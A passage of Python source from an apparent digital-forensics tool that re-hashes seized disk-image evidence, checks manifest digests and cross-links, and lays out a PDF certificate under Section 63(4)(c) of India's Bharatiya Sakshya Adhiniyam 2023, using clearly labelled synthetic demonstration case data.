                   {"stage": 4, "name": fin, "steps": [2, 3, 4, 5, 6, 7, 8]}],
        "steps": steps, "warnings": [],
    }
    c["storyline_sha256"] = _sha256_hex(canonical_json({k: v for k, v in c.items() if k != "generated_utc"}))
    _DEMO_CACHE.update({"image": image, "video": video, "filename": filename, "a": a, "b": b, "c": c,
                        "layout": layout})
    return _DEMO_CACHE


# --------------------------------------------------------------------------- #
# Verification of the inputs before anything is certified                     #
# --------------------------------------------------------------------------- #

class EvidenceVerifier:
    """Re-hashes evidence and anchors, recomputes manifest digests, checks cross-sector bindings."""

    def __init__(self, a: Dict[str, Any], b: Optional[Dict[str, Any]], c: Optional[Dict[str, Any]],
                 evidence: _Source, video: _Source, evidence_root: Optional[str], use_sector_a: bool = True,
                 strict: bool = False):
        self.a, self.b, self.c = a, b, c
        self.v = evidence_view(a)
        self.evidence, self.video, self.root = evidence, video, evidence_root
        self.use_sector_a = use_sector_a
        self.strict = strict

    def run(self) -> Dict[str, Any]:
        v = self.v
        blocking: List[str] = []
        notes: List[str] = []
        rows: List[Dict[str, Any]] = []
        rh = None
        if self.evidence.available:
            try:
                rh = rehash_evidence(self.evidence, v["bad_sectors"], v["sector_size"], v["fill"])
            except (OSError, IOError) as e:
                blocking.append(f"Evidence could not be read for re-hashing: {e}")
        elif self.strict:
            blocking.append("Strict mode: the evidence image was not presented to Sector D, so its digests cannot "
                            "be re-hashed before certification.")
        else:
            notes.append("Evidence image not presented to Sector D: digests are shown as recorded by Sector A "
                         "and were not re-hashed.")
        if rh is not None and v["size"] is not None and rh["size"] != v["size"]:
            blocking.append(f"Evidence size {rh['size']} bytes differs from the recorded {v['size']} bytes")

        def row(label: str, alg: str, recorded: Optional[str], computed: Optional[str], basis_match: str,
                key: str) -> None:
            if recorded is None:
                status = NOT_RECORDED
            elif computed is None:
                status = RECORDED_ONLY
            elif computed == recorded:
                status = basis_match
            else:
                status = MISMATCH
                blocking.append(f"{label}: recomputed {computed[:16]}... differs from recorded {recorded[:16]}...")
            rows.append({"key": key, "label": label, "algorithm": alg, "recorded": recorded, "computed": computed,
                         "status": status})

        row("Electronic record (whole image)", "SHA-256", v["sha256"], rh and rh["sha256_linear"], MATCH_EVIDENCE,
            "sha256")
        if v["bad_sectors"]:
            row("Readable extent (bad sectors excluded)", "SHA-256", v["sha256_valid"], rh and rh["sha256_valid"],
                MATCH_EVIDENCE, "sha256_valid")
        row("Electronic record (whole image)", "BLAKE2b-512", v["blake2b"], rh and rh["blake2b"], MATCH_EVIDENCE,
            "blake2b")
        merkle_computed, merkle_basis = None, MATCH_EVIDENCE
        if rh is not None:
            merkle_computed = rh["merkle_root"]
            if v["chunk_roots"] and rh["chunk_roots"] != v["chunk_roots"]:
                bad = [i for i, (x, y) in enumerate(zip(rh["chunk_roots"], v["chunk_roots"])) if x != y]
                blocking.append(f"Merkle chunk roots differ for 4 MB chunks {bad}")
        elif v["chunk_roots"]:
            merkle_computed = _merkle_root([bytes.fromhex(x) for x in v["chunk_roots"]]).hex()
            merkle_basis = MATCH_RECOMPUTED
        row("Merkle root (RFC 6962, 1 KB leaves)", "SHA-256", v["merkle_root"], merkle_computed, merkle_basis,
            "merkle_root")
        video_computed = self.video.sha256() if self.video.available else None
        row("BNSS s.105 audio-video seizure recording", "SHA-256", v["video_sha"], video_computed, MATCH_EVIDENCE,
            "video_sha")
        if v["video_sha"] is None:
            notes.append("No Section 105 BNSS audio-video seizure recording is bound to this acquisition.")
        elif video_computed is None:
            msg = ("Section 105 BNSS seizure recording: its SHA-256 is recorded by Sector A but the recording was not "
                   "presented to Sector D, so it was not re-hashed and the bound evidence root is derived from the "
                   "recorded value only; the expert's opinion on the recording is provisional.")
            if self.strict:
                blocking.append("Strict mode: " + msg)
            else:
                notes.append(msg)
        vc = v["video_check"]
        if isinstance(vc, dict) and vc.get("verified") is False:
            blocking.append("Sector A's Section 105 BNSS recording continuity check FAILED: " +
                            ("; ".join(str(f) for f in (vc.get("findings") or [])) or "no findings recorded"))
        elif v["video_sha"] is not None and not isinstance(vc, dict):
            notes.append("Sector A recorded no Section 105 BNSS recording continuity check result.")
        bound_computed = None
        if v["merkle_root"] and _is_hex(v["merkle_root"], 64) and (v["video_sha"] is None or _is_hex(v["video_sha"], 64)):
            bound_computed = bound_root(merkle_computed or v["merkle_root"], video_computed or v["video_sha"])
        row("Bound evidence root = SHA-256(Merkle root || recording)", "SHA-256", v["bound_root"], bound_computed,
            MATCH_RECOMPUTED, "bound_root")

        a_verdict: Optional[Tuple[bool, str]] = None
        if (self.use_sector_a and _sector_a is not None and v["full_layout"] and v["tree_alg"]
                and isinstance(self.evidence.src, str) and self.evidence.available):
            try:
                a_verdict = _sector_a.SutraEvidenceVault().verify_integrity(self.evidence.src, self.a)
            except Exception as e:  # pragma: no cover - verifier crashed
                a_verdict = (False, f"Sector A verifier error: {e}")
            if not a_verdict[0]:
                blocking.append(f"Sector A verifier: {a_verdict[1]}")
        for key, label, alg, rec in (("tree", "Tree hash of the image", (v["tree_alg"] or "tree").upper(), v["tree"]),
                                     ("master_root", "Master case root v3 (FIR, seals, clock bound)",
                                      (v["tree_alg"] or "tree").upper(), v["master_root"])):
            if rec is None:
                continue
            if a_verdict is None:
                status = RECORDED_ONLY
            elif a_verdict[0]:
                status = MATCH_SECTOR_A
            else:
                status = f"NOT CONFIRMED - {a_verdict[1]}"
            rows.append({"key": key, "label": label, "algorithm": alg, "recorded": rec, "computed": None,
                         "status": status})

        digests: List[Dict[str, Any]] = []

        def digest(name: str, recorded: Optional[str], computed: Optional[str]) -> None:
            if recorded is None:
                digests.append({"document": name, "recorded": None, "status": NOT_RECORDED})
                notes.append(f"{name} carries no self-digest.")
                return
            ok = recorded == computed
            digests.append({"document": name, "recorded": recorded, "status": MATCH_RECOMPUTED if ok else MISMATCH})
            if not ok:
                blocking.append(f"{name} has been altered since it was written (self-digest mismatch)")

        digest("Sector A evidence manifest", v["manifest_digest"],
               _sha256_hex(canonical_json_a({k: x for k, x in self.a.items() if k != "manifest_canonical_sha256"})))
        bsm = v["bad_manifest"] or {}
        if (v["bad_sectors"] or v["bad_byte_offsets"]) and not bsm.get("manifest_sha256"):
            blocking.append("Bad-sector manifest lists unreadable sectors but carries no manifest_sha256, so the "
                            "sector list and fill pattern cannot be shown to be unaltered")
            digests.append({"document": "Bad-sector manifest", "recorded": None, "status": NOT_RECORDED})
        elif bsm.get("manifest_sha256"):
            digest("Bad-sector manifest", bsm.get("manifest_sha256"),
                   _sha256_hex(canonical_json_a({k: x for k, x in bsm.items() if k != "manifest_sha256"})))
        if self.b is not None:
            digest("Sector B triage manifest", self.b.get("manifest_sha256"),
                   _sha256_hex(canonical_json({k: x for k, x in self.b.items() if k != "manifest_sha256"})))
        if self.c is not None:
            digest("Sector C incident storyline", self.c.get("storyline_sha256"),
                   _sha256_hex(canonical_json({k: x for k, x in self.c.items()
                                               if k not in ("generated_utc", "storyline_sha256")})))

        bindings: List[Dict[str, Any]] = []

        def bind(check: str, ok: bool, detail: str) -> None:
            bindings.append({"check": check, "ok": ok, "detail": detail})
            if not ok:
                blocking.append(f"{check}: {detail}")

        if self.b is not None:
            sab = self.b.get("sector_a_binding") or {}
            bind("Sector B case matches Sector A", self.b.get("case_id") == v["case"],
                 f"{self.b.get('case_id')} / {v['case']}")
            bind("Sector B bound to this Sector A acquisition", sab.get("evidence_id") == v["evidence_id"],
                 f"evidence_id {sab.get('evidence_id')}")
            if sab.get("sha256_linear_primary") is not None:
                bind("Sector B records the same image SHA-256", sab.get("sha256_linear_primary") == v["sha256"],
                     str(sab.get("sha256_linear_primary"))[:16])
        if self.c is not None:
            sac = self.c.get("sector_a_binding") or {}
            bind("Sector C bound to this Sector A acquisition", sac.get("evidence_id") == v["evidence_id"],
                 f"evidence_id {sac.get('evidence_id')}")
            if sac.get("manifest_canonical_sha256") is not None:
                bind("Sector C records this Sector A manifest digest",
                     sac.get("manifest_canonical_sha256") == v["manifest_digest"],
                     str(sac.get("manifest_canonical_sha256"))[:16])
            if self.b is not None:
                sbc = self.c.get("sector_b_binding") or {}
                bind("Sector C built from this Sector B manifest",
                     sbc.get("manifest_sha256") == self.b.get("manifest_sha256"),
                     str(sbc.get("manifest_sha256"))[:16])

        anchors = self._verify_anchors(blocking, notes)
        adm = v["admissibility"] or {}
        if adm.get("status") == "REJECTED_FOR_COURT":
            blocking.append("Sector A assessed the acquisition REJECTED_FOR_COURT: " +
                            "; ".join(adm.get("blocking_issues") or []))
        for w in adm.get("warnings") or []:
            notes.append(f"Sector A: {w}")
        if v["bad_sectors"]:
            notes.append(f"{len(v['bad_sectors'])} unreadable sector(s) of {v['sector_size']} bytes were filled with "
                         f"{bsm.get('fill_pattern', '0xDEADBEEF')} at acquisition; the whole-image SHA-256 is of the "
                         f"filled (composite) image and the readable-extent SHA-256 covers readable bytes only; see "
                         f"the Bad-Sector Manifest annexure.")
        status = NOT_FIT if blocking else (READY_NOTES if notes else READY)
        return {"status": status, "blocking": blocking, "notes": notes, "hash_rows": rows, "digests": digests,
                "bindings": bindings, "anchors": anchors, "sector_a_verifier": a_verdict,
                "rehash": rh, "evidence_rehashed": rh is not None,
                "video_presented": video_computed is not None,
                "video_verified": video_computed is not None and video_computed == v["video_sha"]
                and not (isinstance(vc, dict) and vc.get("verified") is False)}

    def _resolve(self, name: Optional[str]) -> Optional[_Source]:
        if not name:
            return None
        base = os.path.basename(str(name).replace("\\", "/"))
        if self.evidence.available and base == (self.v["filename"] or ""):
            return self.evidence
        if self.root:
            for cand in (os.path.join(self.root, str(name)), os.path.join(self.root, base)):
                if os.path.isfile(cand):
                    return _Source(cand)
        return None

    def _verify_anchors(self, blocking: List[str], notes: List[str]) -> Dict[str, Any]:
        seen: Dict[Tuple[Any, ...], Dict[str, Any]] = {}
        refs: List[Tuple[str, str, Dict[str, Any]]] = []
        if self.b is not None:
            for lead in self.b.get("symbolic_anchors") or []:
                for path, anc in _anchor_iter(lead):
                    refs.append(("B", f"{lead.get('lead_id')}:{path}", anc))
        if self.c is not None:
            for st in self.c.get("steps") or []:
                for path, anc in _anchor_iter(st):
                    refs.append(("C", f"step {st.get('step')}:{path}", anc))
            for bnd in self.c.get("identity_bindings") or []:
                for path, anc in _anchor_iter(bnd):
                    refs.append(("C", f"binding:{path}", anc))
        bad = set(self.v["bad_sectors"])
        ss = self.v["sector_size"]
        for sector, where, anc in refs:
            name = anc.get("file_path") or anc.get("source_file")
            key = (os.path.basename(str(name or "")), anc["byte_offset"], anc["length"], anc["sha256"])
            if key in seen:
                seen[key]["refs"].append(f"{sector} {where}")
                continue
            entry = {"file": key[0], "byte_offset": key[1], "length": key[2], "sha256": key[3],
                     "source_type": anc.get("source_type"), "refs": [f"{sector} {where}"]}
            off, ln = int(anc["byte_offset"]), int(anc["length"])
            src = self._resolve(name)
            in_bad = src is self.evidence and any(s in bad for s in range(off // ss, (off + max(ln, 1) - 1) // ss + 1))
            if src is None:
                entry["status"] = "UNRESOLVED - source not presented"
            elif in_bad:
                entry["status"] = "UNVERIFIABLE - lies in an unreadable sector"
            else:
                got = src.read(off, ln)
                entry["status"] = "MATCH" if len(got) == ln and _sha256_hex(got) == anc["sha256"] else MISMATCH
            seen[key] = entry
        items = list(seen.values())
        mism = [e for e in items if e["status"] == MISMATCH]
        unres = [e for e in items if e["status"] != "MATCH" and e["status"] != MISMATCH]
        for e in mism:
            blocking.append(f"Byte anchor {e['file']}@{e['byte_offset']}+{e['length']} ({e['refs'][0]}) "
                            f"does not re-hash to its recorded SHA-256")
        if unres:
            notes.append(f"{len(unres)} of {len(items)} byte anchors could not be re-hashed "
                         f"({unres[0]['status'].split(' - ')[-1]}).")
        return {"total": len(items), "verified": sum(1 for e in items if e["status"] == "MATCH"),
                "mismatched": len(mism), "unresolved": len(unres), "items": items}


# --------------------------------------------------------------------------- #
# Layout                                                                      #
# --------------------------------------------------------------------------- #

PAGE_W, PAGE_H = 595.2756, 841.8898
OUTER, INNER = 36.0, 40.0
X0, X1 = 52.0, PAGE_W - 52.0
BODY_BOTTOM = 66.0
SCHEDULE_SOURCES = ("Computer / Storage Media", "DVR", "Mobile", "Flash Drive", "CD / DVD", "Server", "Cloud", "Other")
BLANK = "________________________"
PRINTER_DOT = 72.0 / 300.0        # one 300 dpi dot = 0.24 pt
QR_MIN_DOTS = 5
BS_ANNEX_ROWS = 400                # bad-sector rows listed in Annexure BS; the rest are summarised


def qr_module_size(n: int, avail: float, dot: float = PRINTER_DOT, min_dots: int = QR_MIN_DOTS) -> float:
    """
    QR module edge in points: a whole number of 300 dpi printer dots (so a laser printer never
    dithers a module edge), as large as fits n modules plus the 4-module quiet zone each side.
    """
    dots = int(avail / (n + 8) / dot + 1e-9)
    if dots < min_dots:
        raise RuntimeError(f"QR version with {n} modules needs {(n + 8) * min_dots * dot:.1f} pt; only {avail:.1f} pt "
                           f"available at {min_dots} printer dots per module")
    return round(dots * dot, 4)


def _wrap(rec: PageRecorder, text: str, key: str, size: float, width: float) -> List[str]:
    text = pdf_safe(text)
    out: List[str] = []
    for para in text.split("\n"):
        line = ""
        for word in para.split(" "):
            cand = word if not line else line + " " + word
            if rec.width(cand, key, size) <= width:
                line = cand
                continue
            if line:
                out.append(line)
            while rec.width(word, key, size) > width:  # break long tokens (hex digests)
                k = max(1, int(len(word) * width / max(rec.width(word, key, size), 1e-6)))
                while k > 1 and rec.width(word[:k], key, size) > width:
                    k -= 1
                out.append(word[:k])
                word = word[k:]
            line = word
        out.append(line)
    return out


class _Flow:
    """A y-cursor over a page body; breaks pages when allowed, else records an overflow."""

    def __init__(self, rec: PageRecorder, y_top: float, fs: float = 1.0,
                 on_new_page: Optional[Callable[[], float]] = None, x0: float = X0, x1: float = X1):
        self.rec, self.y, self.fs = rec, y_top, fs
        self.on_new_page = on_new_page
        self.x0, self.x1 = x0, x1
        self.overflow = False

    def size(self, s: float) -> float:
        return s * self.fs

    def need(self, h: float) -> None:
        if self.y - h >= BODY_BOTTOM:
            return
        if self.on_new_page is not None:
            self.rec.new_page()
            self.y = self.on_new_page()
        else:
            self.overflow = True

    def gap(self, h: float) -> None:
        self.y -= h * self.fs

    def heading(self, text: str) -> None:
        sz = self.size(8.6)
        self.need(sz * 3.2)
        self.y -= sz * 1.6
        self.rec.text(self.x0, self.y, text, "B", sz, PALETTE["navy"])
        self.y -= sz * 0.45
        self.rec.line(self.x0, self.y, self.x1, self.y, PALETTE["cyan"], 0.8)
        self.y -= sz * 0.55

    def para(self, text: str, key: str = "R", size: float = 7.6, color: str = PALETTE["text"],
             indent: float = 0.0, label: Optional[str] = None) -> None:
        sz = self.size(size)
        lead = sz * 1.28
        x = self.x0 + indent + (sz * 1.9 if label else 0)
        lines = _wrap(self.rec, text, key, sz, self.x1 - x)
        for i, ln in enumerate(lines):
            self.need(lead)
            self.y -= lead
            if i == 0 and label:
                self.rec.text(self.x0 + indent, self.y, label, "B", sz, PALETTE["navy"])
            self.rec.text(x, self.y, ln, key, sz, color)
        self.y -= sz * 0.35

    def table(self, headers: Optional[Sequence[str]], rows: Sequence[Sequence[Any]], widths: Sequence[float],
              keys: Optional[Sequence[str]] = None, size: float = 7.0, colors: Optional[Sequence[Any]] = None,
              x0: Optional[float] = None, zebra: bool = True) -> None:
        x0 = self.x0 if x0 is None else x0
        sz = self.size(size)
        lead, pad = sz * 1.22, sz * 0.42
        keys = list(keys or ["R"] * len(widths))
        total = sum(widths)

        def draw_header() -> None:
            if not headers:
                return
            hl = [_wrap(self.rec, h, "B", sz, w - 2 * pad) for h, w in zip(headers, widths)]
            h = max(len(x) for x in hl) * lead + 2 * pad
            self.need(h + lead + 2 * pad)
            self.rec.fill_rect(x0, self.y - h, total, h, PALETTE["navy"])
            cx = x0
            for lines, w in zip(hl, widths):
                for i, ln in enumerate(lines):
                    self.rec.text(cx + pad, self.y - pad - (i + 1) * lead + sz * 0.22, ln, "B", sz, PALETTE["white"])
                cx += w
            self.y -= h

        draw_header()
        for r, row in enumerate(rows):
            cells = [_wrap(self.rec, str(v), k, sz * (0.92 if k == "M" else 1), w - 2 * pad)
                     for v, k, w in zip(row, keys, widths)]
            h = max(len(c) for c in cells) * lead + 2 * pad
            before = self.rec.page_no
            self.need(h)
            if self.rec.page_no != before:
                draw_header()
            if zebra and r % 2 == 0:
                self.rec.fill_rect(x0, self.y - h, total, h, PALETTE["light"])
            cx = x0
            for ci, (lines, k, w) in enumerate(zip(cells, keys, widths)):
                col = PALETTE["text"]
                if colors and colors[r] and colors[r][ci]:
                    col = colors[r][ci]
                ksz = sz * (0.92 if k == "M" else 1)
                for i, ln in enumerate(lines):
                    self.rec.text(cx + pad, self.y - pad - (i + 1) * lead + sz * 0.22, ln, k, ksz, col)
                cx += w
            self.rec.line(x0, self.y - h, x0 + total, self.y - h, PALETTE["border"], 0.4)
            self.y -= h
        self.y -= sz * 0.5

    def kv(self, rows: Sequence[Tuple[str, Any]], label_w: float = 128.0, width: Optional[float] = None,
           size: float = 7.2, value_key: str = "R") -> None:
        w = (self.x1 - self.x0) if width is None else width
        self.table(None, [(k, v) for k, v in rows], [label_w * self.fs, w - label_w * self.fs],
                   keys=["B", value_key], size=size,
                   colors=[(PALETTE["muted"], None)] * len(rows))


def _status_color(status: str) -> str:
    return PALETTE["emerald"] if status == READY else PALETTE["amber"] if status == READY_NOTES else PALETTE["red"]


def _frame(rec: PageRecorder) -> None:
    rec.stroke_rect(OUTER, OUTER, PAGE_W - 2 * OUTER, PAGE_H - 2 * OUTER, PALETTE["navy"], 1.4)
    rec.stroke_rect(INNER, INNER, PAGE_W - 2 * INNER, PAGE_H - 2 * INNER, PALETTE["border"], 0.6)


def _header(rec: PageRecorder, court: str, title: str, sub: str, status: str, status_text: str,
            demo: bool) -> float:
    top = PAGE_H - INNER
    band = 64.0
    rec.fill_rect(INNER, top - band, PAGE_W - 2 * INNER, band, PALETTE["navy"])
    c = PAGE_W / 2
    court_sz = 9.6
    while rec.width(court.upper(), "B", court_sz) > PAGE_W - 2 * X0 and court_sz > 6:
        court_sz -= 0.2
    rec.text(c, top - 16, court.upper(), "B", court_sz, PALETTE["white"], "center")
    rec.text(c, top - 29, "CERTIFICATE UNDER SECTION 63(4)(c), BHARATIYA SAKSHYA ADHINIYAM, 2023", "B", 8.6,
             PALETTE["cyan"], "center")
    rec.text(c, top - 43, title, "B", 9.4, PALETTE["white"], "center")
    sub_sz = 7.0
    while rec.width(sub, "R", sub_sz) > PAGE_W - 2 * X0 and sub_sz > 5:
        sub_sz -= 0.2
    rec.text(c, top - 55, sub, "R", sub_sz, PALETTE["border"], "center")
    rec.line(INNER, top - band, PAGE_W - INNER, top - band, PALETTE["cyan"], 2.0)
    y = top - band - 5
    rec.fill_rect(X0, y - 13, X1 - X0, 13, _status_color(status))
    st = status_text
    st_sz = 7.2
    while rec.width(st, "B", st_sz) > X1 - X0 - 8 and st_sz > 5:
        st_sz -= 0.2
    rec.text(X0 + 4, y - 9.2, st, "B", st_sz, PALETTE["white"])
    y -= 13
    if demo:
        y -= 3
        rec.stroke_rect(X0, y - 12, X1 - X0, 12, PALETTE["red"], 0.8)
        rec.text(c, y - 8.6, "DEMONSTRATION - SYNTHETIC CASE DATA GENERATED BY SECTOR D - NOT FOR FILING", "B", 7.2,
                 PALETTE["red"], "center")
        y -= 12
    return y - 2


def _footer(rec: PageRecorder, left: str, right: str) -> None:
    rec.line(X0, 58, X1, 58, PALETTE["border"], 0.5)
    sz = 6.2
    while rec.width(left, "R", sz) + rec.width(right, "R", sz) > X1 - X0 - 12 and sz > 4.5:
        sz -= 0.2
    rec.text(X0, 49, left, "R", sz, PALETTE["muted"])
    rec.text(X1, 49, right, "R", sz, PALETTE["muted"], "right")


ALGORITHM_STANDARD_LINE = ("Algorithm standard: [ ] SHA-1  [X] SHA-256  [ ] MD5  [X] Other (Legally acceptable "
                           "standard: BLAKE2b-512, RFC 6962 SHA-256 Merkle Root)")
SIGNATURE_BLOCKED = "SIGNATURE BLOCKED \u2014 NOT FIT FOR FILING (HASH / INTEGRITY MISMATCH)"


def _sig_block(fl: _Flow, fields: Sequence[Tuple[str, str]], caption: str, blocked: bool = False) -> None:
    """
    Fields on the left; date, time, place and a signature box on the right. When the record is
    NOT_FIT_FOR_FILING the box carries no signature line, only the red SIGNATURE BLOCKED notice.
    """
    sz = fl.size(7.2)
    lead = sz * 1.55
    box_w = 170.0
    left_w = fl.x1 - fl.x0 - box_w - 12
    lab_w = max(fl.rec.width(k, "B", sz) for k, _ in fields) + 8
    rows = []
    for k, v in fields:
        lines = _wrap(fl.rec, v or BLANK, "R", sz, left_w - lab_w)
        rows.append((k, lines))
    h = sum(len(ls) for _, ls in rows) * lead + 2 * lead
    h = max(h, 92 * fl.fs)
    fl.need(h + 8)
    top = fl.y - 4
    fl.rec.fill_rect(fl.x0, top - h, fl.x1 - fl.x0, h, PALETTE["light"])
    fl.rec.stroke_rect(fl.x0, top - h, fl.x1 - fl.x0, h, PALETTE["border"], 0.5)
    fl.rec.text(fl.x0 + 6, top - lead + 2, caption, "B", sz, PALETTE["navy"])
    y = top - lead
    for k, lines in rows:
        for i, ln in enumerate(lines):
            y -= lead
            if i == 0:
                fl.rec.text(fl.x0 + 6, y + 2, k, "B", sz, PALETTE["muted"])
            fl.rec.text(fl.x0 + 6 + lab_w, y + 2, ln, "R", sz, PALETTE["text"])
    bx = fl.x1 - box_w - 6
    if blocked:
        fl.rec.fill_rect(bx, top - h + 6, box_w, h - 12, PALETTE["white"])
        fl.rec.stroke_rect(bx, top - h + 6, box_w, h - 12, PALETTE["red"], 1.6)
        bsz = sz * 1.05
        lines = _wrap(fl.rec, SIGNATURE_BLOCKED, "B", bsz, box_w - 16)
        yy = top - h / 2 + len(lines) * bsz * 1.3 / 2 - bsz
        for ln in lines:
            fl.rec.text(bx + box_w / 2, yy, ln, "B", bsz, PALETTE["red"], "center")
            yy -= bsz * 1.3
    else:
        fl.rec.stroke_rect(bx, top - h + 6, box_w, h - 12, PALETTE["navy"], 0.7)
        yy = top - 6 - lead
        for label in ("Date (DD/MM/YYYY):  ____ / ____ / ________", "Time (IST):  ____ : ____",
                      "Place:  ______________"):
            fl.rec.text(bx + 6, yy, label, "R", sz * 0.95, PALETTE["text"])
            yy -= lead
        fl.rec.line(bx + 10, top - h + 24, bx + box_w - 10, top - h + 24, PALETTE["muted"], 0.5)
        fl.rec.text(bx + box_w / 2, top - h + 13, "Signature (and seal)", "R", sz * 0.9, PALETTE["muted"], "center")
    fl.y = top - h - 4


# --------------------------------------------------------------------------- #
# Certificate generator                                                       #
# --------------------------------------------------------------------------- #

_DEMO_PARTIES = {
    "VICTIM_COOPERATIVE": {"name": "Rahul Mehta (demonstration)", "relation": "son of Shri Suresh Mehta",
                           "address": "14, Sector 21, Gandhinagar, Gujarat", "designation": "Complainant",
                           "badge": "FIR Complainant Receipt CCPS/2026/042-C", "police_station": "Cyber Crime Police Station, Gandhinagar",
                           "organisation": "Private individual", "place": "Gandhinagar"},
    "SUSPECT_HOSTILE": {"name": "Inspector A. K. Rathore (demonstration)", "relation": "Investigating Officer",
                        "address": "Cyber Crime Police Station, Sector 18, Gandhinagar", "designation":
                            "Inspector of Police, Investigating Officer", "badge": "GJ-CCPS-1127",
                        "police_station": "Cyber Crime Police Station, Gandhinagar", "organisation": "Gujarat Police",
                        "place": "Gandhinagar"},
    "INTERMEDIARY_NODAL": {"name": "Priya Nair (demonstration)", "relation": "Nodal Officer",
                           "address": "Yes Bank Ltd, Nodal Office, Mumbai", "designation":
                               "Nodal Officer (Law Enforcement Requests)", "badge": "EMP-YB-55210",
                           "police_station": "Request from Cyber Crime Police Station, Gandhinagar",
                           "organisation": "Yes Bank Ltd", "place": "Mumbai"},
}
_DEMO_EXPERT = {"name": "Dr. S. Iyer (demonstration)", "qualification": "Ph.D. (Digital Forensics), M.Tech (Cyber Security)",
                "designation": "Examiner of Electronic Evidence", "laboratory":
                    "Digital Forensics Laboratory, National Forensic Sciences University, Gandhinagar",
                "accreditation": "ISO/IEC 17025:2017 (demonstration certificate no. DEMO-0000)",
                "notification_79a": "Notified Examiner of Electronic Evidence u/s 79A IT Act, 2000 "
                                    "(demonstration reference)", "notified_79a": True, "place": "Gandhinagar",
                "examiner_reconciliation": (
                    "Demonstration reconciliation. C04 (an inbound remote-desktop trace) and C14 (an anomalous "
                    "parent process) point towards intrusion and C13 (process lineage) could not be determined. "
                    "I examined them against C01-C03, C05 and C06, which show a local interactive console session "
                    "by the device owner's account with no remote-access tool or remote logon in the prior 24 "
                    "hours, and against C07-C12, which show no system tampering. The real examiner must replace "
                    "this text with the examination actually done before signing.")}
_DEMO_CASE = {"court": "In the Court of the Chief Judicial Magistrate, Gandhinagar",
              "fir": "FIR No. 042/2026, Cyber Crime Police Station, Gandhinagar",
              "offences": "Sections 318(4), 319(2), 336(3) BNS 2023; Sections 66C, 66D IT Act 2000",
              "seizure_memo": "SZ-17/2026", "seizure_place": "Residence of the accused, Sector 7, Gandhinagar",
              "seizure_utc": "2026-10-15T05:10:00.000Z",
              "notice_94": "Notice No. CCPS/94/2026/311", "notice_94_utc": "2026-10-16T06:00:00.000Z",
              "entity": "Yes Bank Ltd", "period": "01/09/2026 to 15/10/2026",
              "io": "Inspector A. K. Rathore", "lab": "NFSU Digital Forensics Laboratory, Gandhinagar"}


class BSACertificateGenerator:
    """
    Builds the Section 63(4)(c) BSA 2023 certificate (The Schedule, PART A and PART B), its
    annexures, the FIU-IND STR and the Section 106 BNSS / Section 17(1A) PMLA freeze notice from
    Sector A, B and C outputs, after verifying them.
    """

    def __init__(self, evidence_manifest: Any = None, triage_manifest: Any = None, storyline: Any = None,
                 scenario: Any = ScenarioType.SUSPECT_HOSTILE, track: Any = None,
                 evidence_path: Optional[str] = None, seizure_video_path: Optional[str] = None,
                 evidence_root: Optional[str] = None, custodian: Optional[Dict[str, Any]] = None,
                 expert: Optional[Dict[str, Any]] = None, case_particulars: Optional[Dict[str, Any]] = None,
                 pdf_engine: str = "auto", qr_engine: str = "auto", embed_fonts: bool = True,
                 generated_utc: Optional[str] = None, use_sector_a_verifier: bool = True,
                 strict: bool = False):
        self.scenario = _coerce_enum(scenario, ScenarioType)
        # No track given: a seized or owned device is primary evidence; intermediary logs are output.
        self.track = TrackType.default_for(self.scenario) if track is None else _coerce_enum(track, TrackType)
        self.strict = bool(strict)
        self.demo = evidence_manifest is None
        demo = demo_case() if self.demo else None
        if demo is not None:
            if triage_manifest is not None or storyline is not None:
                raise LegalInputError("triage manifest or storyline given without a Sector A evidence manifest")
            self.a, self.b, self.c = demo["a"], demo["b"], demo["c"]
            evidence_src: Union[str, bytes, None] = demo["image"]
            video_src: Union[str, bytes, None] = demo["video"]
        else:
            self.a = _load_json_input(evidence_manifest, "Sector A evidence manifest")  # type: ignore[assignment]
            self.b = _load_json_input(triage_manifest, "Sector B triage manifest")
            self.c = _load_json_input(storyline, "Sector C incident storyline")
            if not isinstance(self.a.get("cryptographic_hashes"), dict) or not self.a.get("evidence_id"):
                raise LegalInputError("Sector A evidence manifest: no evidence_id / cryptographic_hashes")
            if self.b is not None and "symbolic_anchors" not in self.b:
                raise LegalInputError("Sector B triage manifest: no symbolic_anchors")
            if self.c is not None and "steps" not in self.c:
                raise LegalInputError("Sector C incident storyline: no steps")
            if evidence_path is None and evidence_root:
                cand = os.path.join(evidence_root, str(evidence_view(self.a)["filename"] or ""))
                evidence_path = cand if os.path.isfile(cand) else None
            if evidence_path is None and isinstance(evidence_manifest, (str, os.PathLike)):
                base = os.path.dirname(os.path.abspath(os.fspath(evidence_manifest)))
                for d in (base, os.path.dirname(base)):
                    cand = os.path.join(d, str(evidence_view(self.a)["filename"] or ""))
                    if os.path.isfile(cand):
                        evidence_path = cand
                        break
            if evidence_root is None and isinstance(evidence_path, (str, os.PathLike)):
                evidence_root = os.path.dirname(os.path.abspath(evidence_path))
            evidence_src, video_src = evidence_path, seizure_video_path
        self.view = evidence_view(self.a)
        self.evidence = _Source(evidence_src, self.view["filename"] or "")
        self.video = _Source(video_src)
        self.evidence_root = evidence_root
        party = dict(_DEMO_PARTIES[self.scenario.value]) if self.demo else {}
        party.update(custodian or {})
        self.custodian = party
        exp = dict(_DEMO_EXPERT) if self.demo else {}
        exp.update(expert or {})
        self.expert = exp
        cp = dict(_DEMO_CASE) if self.demo else {}
        cp.update(case_particulars or {})
        self.case = cp
        if pdf_engine not in ("auto", "reportlab", "pure"):
            raise LegalInputError("pdf_engine must be auto, reportlab or pure")
        if pdf_engine == "reportlab" and not _HAVE_REPORTLAB:
            raise LegalInputError("pdf_engine='reportlab' requested but reportlab is not installed")
        # The built-in writer is the archival default: deterministic, single revision, one %%EOF.
        self.pdf_engine = "pure" if pdf_engine == "auto" else pdf_engine
        if qr_engine not in ("auto", "qrcode", "builtin"):
            raise LegalInputError("qr_engine must be auto, qrcode or builtin")
        if qr_engine == "qrcode" and _qrcode_lib is None:
            raise LegalInputError("qr_engine='qrcode' requested but the qrcode package is not installed")
        self.qr_engine = qr_engine
        self.fonts = FontSet(embed=embed_fonts)
        self.generated_utc = generated_utc or _utc_now_iso()
        self.use_sector_a_verifier = use_sector_a_verifier
        self._verification: Optional[Dict[str, Any]] = None
        self._cert: Optional[Dict[str, Any]] = None
        self._qr: Optional[Tuple[List[List[bool]], str, Dict[str, Any]]] = None
        self.last_render: Dict[str, Any] = {}

    # ----- verification and content ---------------------------------------- #

    def verify(self) -> Dict[str, Any]:
        if self._verification is None:
            self._verification = EvidenceVerifier(self.a, self.b, self.c, self.evidence, self.video,
                                                  self.evidence_root, self.use_sector_a_verifier, self.strict).run()
        return self._verification

    def _party(self, key: str, default: str = BLANK) -> str:
